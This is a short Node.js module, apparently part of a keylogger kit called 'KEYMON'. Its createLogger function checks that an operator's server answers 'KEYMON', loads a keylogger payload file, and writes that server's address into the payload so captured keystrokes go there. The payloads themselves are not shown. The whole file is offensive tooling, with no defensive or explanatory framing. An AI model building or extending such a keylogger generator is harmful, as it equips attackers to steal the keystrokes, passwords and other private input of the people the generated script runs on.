const { default: axios } = require('axios')
const fs = require("fs")
const path = require("path")

module.exports = {
    createLogger: async ({ payload, origin }) => {
        if (origin.endsWith("/")) origin = origin.slice(0, -1)
        if (!origin.includes("http")) return "Enter valid origin."

        try {
            const response = await axios.get(`${origin}/check`)
            if (response.data != "KEYMON") return "Enter valid origin."
        } catch (error) {
            return error.message
        }

        let code = fs.readFileSync(path.join(process.__dirname, "keylogger", payload), "utf-8")
        code = code.replaceAll("<[URL]>", origin)
        return code
    }
}